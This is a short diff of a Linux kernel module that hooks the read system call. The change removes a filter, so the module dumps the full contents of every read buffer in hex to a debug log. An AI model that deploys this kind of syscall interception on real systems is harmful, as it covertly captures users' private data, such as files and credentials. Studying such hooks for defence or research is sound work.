@@ -35,15 +35,16 @@ asmlinkage long n_sys_read ( unsigned int fd, char __user *buf, size_t count )
         }
         else
         {   
-            if (memstr(debug, "<secret>", count))
-            {   
+//            DEBUG_RW("Intercept reading: fd=%d count=%zu", fd, count);
+//            if (memstr(debug, "<secret>", count))
+//            {   
                 unsigned long i;
                 DEBUG_RW("DEBUG sys_read: fd=%d, count=%zu, buf=\n", fd, count);
                 for ( i = 0; i < count; i++ )
                     DEBUG_RW("%x", *((unsigned char *)debug + i));
                 DEBUG_RW("\n");
                 log_fd_info(fd);
-            }
+ //           }
             kfree(debug);
         }
     }
